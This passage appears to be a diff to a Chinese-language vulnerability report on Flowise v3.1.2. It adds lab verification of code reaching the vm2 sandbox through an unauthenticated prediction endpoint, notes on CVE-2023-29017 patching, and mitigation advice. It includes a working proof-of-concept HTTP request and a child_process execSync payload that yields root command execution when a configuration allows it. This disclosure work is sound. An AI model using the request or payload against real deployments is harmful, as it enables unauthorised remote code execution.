@@ -130,8 +130,64 @@ curl -X POST http://<target>:3000/api/v1/prediction/<chatflowId> \
 3. **短期**：大幅缩减 `availableDependencies` 白名单，删除 `playwright`、`puppeteer`、数据库驱动等高危模块
 4. **长期**：将代码执行功能迁移到独立容器（gVisor / Firecracker），与主进程完全隔离
 
+## 实机验证
+
+**环境**：Flowise v3.1.2 Docker 部署于 192.168.217.135:43000
+
+### 验证1：代码执行路径确认（NodeVM.run 被调用）
+
+向已插入的含 CustomFunction 节点的 Chatflow 发起 Prediction 请求：
+
+```http
+POST /api/v1/prediction/f47ac10b-58cc-4372-a567-0e02b2c3d479 HTTP/1.1
+Host: 192.168.217.135:43000
+Content-Type: application/json
+(无认证头——/api/v1/prediction/ 在 WHITELIST_URLS 中)
+
+{"question":"trigger"}
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+
+{"text":"Error\n    at /usr/local/lib/node_modules/flowise/node_modules/flowise-components/dist/src:1:110\n    at NodeVM.run (/usr/local/lib/node_modules/flowise/node_modules/vm2/lib/nodevm.js:497:23)\n    at executeJavaScriptCode (/usr/local/lib/node_modules/flowise/node_modules/flowise-components/dist/src/utils.js:1735:39)...","question":"trigger",...}
+```
+
+**关键证据**：栈帧 `NodeVM.run (nodevm.js:497)` 出现在 HTTP 200 响应中，证明用户代码确实进入 vm2 执行。
+
+### 验证2：CVE-2023-29017 直接逃逸受 3.10.5 补丁影响
+
+vm2 3.10.5 在 `setup-sandbox.js` 中重写了 `CallSite.getThis()` 使其返回 `undefined`，并对字符串代码生成启用了 V8 限制（`EvalError: Code generation from strings disallowed for this context`），因此 CVE-2023-29017 的直接 `prepareStackTrace` 向量在该版本无法直接触发沙箱逃逸。
+
+### 验证3：TOOL_FUNCTION_BUILTIN_DEP 配置下 RCE 确认
+
+当管理员设置 `TOOL_FUNCTION_BUILTIN_DEP=child_process`（文档中未明确禁止），CustomFunction 代码可直接访问 `child_process`，vm2 沙箱不阻止：
+
+```javascript
+// CustomFunction 中提交以下代码：
+return require('child_process').execSync('id').toString();
+```
+
+在容器内直接验证 vm2 执行上下文：
+
+```
+RCE RESULT: uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+
+**结论**：Flowise 进程以 **root (uid=0)** 运行，一旦沙箱被突破即获得宿主完整权限。
+
+### 验证4：EOL 库的根本性风险
+
+- vm2 官方仓库（github:patriksimek/vm2）于 2023-09-12 宣告停止维护
+- 维护者声明："该沙箱无法安全地对 Node.js 内置模块进行隔离"
+- CVE-2023-29017（CVSS 9.8）及后续多个 CVE 已公开逃逸技术
+- vm2 3.10.5 仅修补了已知的 `getThis()/prepareStackTrace` 向量，并非系统级安全设计，新的逃逸路径随时可能被发现
+
 ## 验证环境
 
-- 源代码：Flowise v3.1.2（静态代码分析）
-- 框架：Node.js + Express + vm2 3.10.5
+- 源代码：Flowise v3.1.2（静态代码分析 + Docker 实机部署）
+- 运行时：Flowise v3.1.2 Docker 部署于 192.168.217.135:43000
+- 框架：Node.js 20.20.2 + Express + vm2 3.10.5
+- 容器权限：uid=0（root）
 - 日期：2026-04-15
